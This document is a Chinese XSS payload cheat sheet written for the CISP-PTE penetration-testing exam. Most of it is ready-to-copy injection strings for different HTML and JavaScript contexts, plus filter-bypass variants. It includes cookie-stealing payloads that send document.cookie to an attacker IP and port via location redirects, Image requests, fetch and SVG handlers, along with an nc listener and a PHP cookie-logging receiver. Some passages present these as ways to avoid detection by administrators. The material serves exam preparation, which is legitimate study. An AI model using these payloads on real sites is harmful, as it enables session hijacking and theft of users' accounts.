# CISP-PTE XSS 考试专用 Payload 速查清单

## 考前核心提醒

1. 考试中XSS核心目标：**获取Cookie/触发指定操作**（而非仅弹窗），弹窗仅用于验证漏洞存在；
2. 第一步先判断**输出上下文**（标签内/属性内/JS内），再选对应Payload；
3. 遇到过滤先测试：输入 `<>`/`script`/`onerror`看是否被拦截，再调整变形。

## 一、按输出上下文分类（核心Payload）

| 输出上下文/场景          | 核心Payload模板                                                                   | 适用场景&考试说明                                                                         |                                                                              |
| :----------------------- | :-------------------------------------------------------------------------------- | :---------------------------------------------------------------------------------------- | :--------------------------------------------------------------------------- |
| HTML标签内容区           | 基础版（无过滤）                                                                  | `<script>alert(1)</script>`                                                             | 验证漏洞存在，考试中优先测这个，被过滤再换下面                               |
| 标签过滤绕过             | `<img src=x onerror=alert(1)>`                                                  | 过滤 `script`标签时用，考试最常用的替代方案                                             |                                                                              |
| 进阶绕过（事件过滤）     | `<svg onload=alert(1)>`                                                         | 过滤 `onerror`时用，svg标签兼容性好，考试高频绕过手段                                   |                                                                              |
| HTML标签属性值           | input属性闭合                                                                     | `" onmouseover=alert(1) x="`                                                            | 双引号未过滤时，闭合value属性+添加鼠标悬浮事件（考试常考input/textarea场景） |
| a标签href属性            | `" onclick=alert(1) href="`                                                     | 闭合a标签href属性+点击事件，需用户交互（考试中若允许交互优先用）                          |                                                                              |
| 单引号属性场景           | `' onfocus=alert(1) x='`                                                        | 标签属性用单引号包裹时（如 `<input value='用户输入'>`）                                 |                                                                              |
| JS字符串上下文           | 双引号字符串闭合                                                                  | `";alert(1);//`                                                                         | 场景示例：`var x="用户输入";`，闭合双引号+执行代码+注释后续内容            |
| 单引号字符串闭合         | `';alert(1);//`                                                                 | 场景示例：`var x='用户输入';`，考试中先测单/双引号哪种生效                              |                                                                              |
| 编码绕过（关键字过滤）   | `"\u0061\u006c\u0065\u0072\u0074(1);//`                                         | 过滤 `alert`关键字时，用Unicode编码（`alert`对应 `\u0061\u006c\u0065\u0072\u0074`） |                                                                              |
| URL伪协议场景            | 基础版                                                                            | `javascript:alert(1)`                                                                   | 无过滤时直接用，点击链接触发                                                 |
| 编码绕过                 | `javascript:alert(1)`                                                           | 过滤 `javascript`关键字时，用HTML实体编码替换部分字符                                   |                                                                              |
| 拿Cookie专用（考试核心） | 基础版                                                                            | `<script>document.location='http://你的IP:端口?c='+document.cookie</script>`            | 无过滤时，将Cookie发送到自己的服务器（需先开NC监听：`nc -nlvp 端口`）      |
| 标签绕过版               | `<img src=x onerror=document.location='http://你的IP:端口?c='+document.cookie>` | 过滤 `script`时用，考试中最常用的拿Cookie方案                                           |                                                                              |
| 拿Cookie专用（考试核心） | `<script>new Image().src='http://你的IP:端口/?c='+document.cookie;</script>`    |                                                                                           |                                                                              |





## 二、常见过滤规则绕过变形（考试必背）

| 被过滤的内容 | 绕过变形方式                     | 示例                                                                               |
| :----------- | :------------------------------- | :--------------------------------------------------------------------------------- |
| `script`   | 大小写/双写/HTML实体             | `<ScRiPt>alert(1)</ScRiPt>`、`<scrscriptipt>alert(1)</scrscriptipt>`           |
| `onerror`  | 换事件（onload/onclick/onfocus） | `<img src=x onload=alert(1)>`、`<input onfocus=alert(1) autofocus>`            |
| `<>`       | HTML实体编码                     | `<img src=x onerror=alert(1)>`（`<`=`&#x3c;`，`>`=`&#x3e;`）             |
| 空格         | 用 `/`/`%0a`/`+`替代       | `<img/src=x/onerror=alert(1)>`                                                   |
| `alert`    | 拼接/Base64编码                  | `eval('al'+'ert(1)')`、`eval(atob('YWxlcnQoMSk='))`（Base64对应 `alert(1)`） |

## 三、考场实战步骤（1分钟快速验证+利用）

1. 输入 `<script>alert(1)</script>` → 弹窗=无过滤，直接用拿Cookie Payload；
2. 无弹窗→输入 `<img src=x onerror=alert(1)>` → 弹窗=标签过滤，用事件类Payload；
3. 仍无弹窗→测试单/双引号闭合（如 `"`/`'`）→ 确认属性上下文，用属性闭合Payload；
4. 关键字被过滤→用大小写/双写/编码变形；
5. 验证漏洞后，替换为**拿Cookie的Payload**（替换自己的IP和端口），完成考试要求。

**备注**：本清单适配CISP-PTE考试高频场景，重点记「HTML标签内容区」「属性值」「拿Cookie」三类核心Payload，可直接复制使用，考前5分钟快速过一遍即可应对90%以上XSS考题。


### 一、 隐蔽外传方式（避免页面跳转）

在模拟考试或实战中，直接跳转 URL 容易被管理员（或自动化脚本）察觉。使用异步请求或静态资源引用更隐蔽。

- **Image 对象外传（最经典、最隐蔽）**：

  利用图片加载请求带出数据，页面不会发生跳转。

  `<script>new Image().src='http://你的IP:端口/?c='+document.cookie;</script>`
- **Fetch API 外传（现代浏览器通用）**：

  使用 POST 方式发送，数据量更大且不留痕迹。

  `<script>fetch('http://你的IP:端口/',{method:'POST',body:document.cookie});</script>`
- **SVG 标签外传**：

  配合 `onerror` 或 `onload` 事件使用。

  `<svg/onload="new Image().src='http://你的IP:端口/?'+document.cookie">`

### 二、 针对关键字过滤的绕过（考试高频点）

如果题目过滤了 `cookie`、`document` 或 `location` 等关键字符，你需要使用编码或字符串拼接。

- **过滤 `document.cookie`**：

  使用数组索引方式绕过对属性名的直接匹配。

  `<script>alert(document['coo'+'kie'])</script>`
- **过滤 `document` 关键字**：

  通过 `window` 对象间接调用。

  `<script>alert(window['docu'+'ment']['cookie'])</script>`
- **十六进制/Unicode 编码绕过**：

  将 `alert(document.cookie)` 整体编码。

  `<script>eval('\x61\x6c\x65\x72\x74\x28\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x63\x6f\x6f\x6b\x69\x65\x29')</script>`

### 三、 针对特殊上下文的闭合（逃逸技巧）

- **在 JavaScript 变量内（String Context）**：

  如果输入点在 `var a = '输入点';`，先闭合再执行。

  `';new Image().src='http://你的IP:端口/?'+document.cookie;//`
- **在 HTML 属性内（Attribute Context）**：

  如果输入点在 `<input value="输入点">`，先闭合属性再添加事件。

  `" onfocus="new Image().src='http://你的IP:端口/?'+document.cookie" autofocus="`

### 四、 考场实用：快速搭建接收端

在 CISP-PTE 考场上，你通常需要快速看到返回的 Cookie。

1. **临时监听（nc）**：

   最快的方式，直接在终端执行：

   `nc -lvvp 端口`
2. **PHP 记录脚本（如果需要记录多条）**：

   将以下代码存为 `index.php`，启动 PHP 内置服务器：

   PHP

   ```
   <?php
   $cookie = $_GET['c'];
   $file = fopen("log.txt", "a");
   fwrite($file, "IP: " . $_SERVER['REMOTE_ADDR'] . " | Cookie: " . $cookie . "\n");
   fclose($file);
   ?>
   ```

   执行：`php -S 0.0.0.0:端口`。

### 五、 核心避坑提醒

1. **HttpOnly 标志**：如果 Cookie 设置了 `HttpOnly`，JavaScript 无法通过 `document.cookie` 读取到它。如果在考试中发现弹窗为空或缺少关键 Session ID，优先检查是否是这个原因（此时可能需要寻找其他攻击路径，如 CSRF 或悬垂标记注入）。
2. **符号过滤**：如果 `()` 被过滤，可以尝试使用反引号替代：`<script>alert`1 `</script>`。
3. **URL 编码**：在通过 URL 参数提交 Payload 时，务必对特殊字符（如 `+`, `&`, `#`）进行 URL 编码，否则 Payload 可能会被截断。
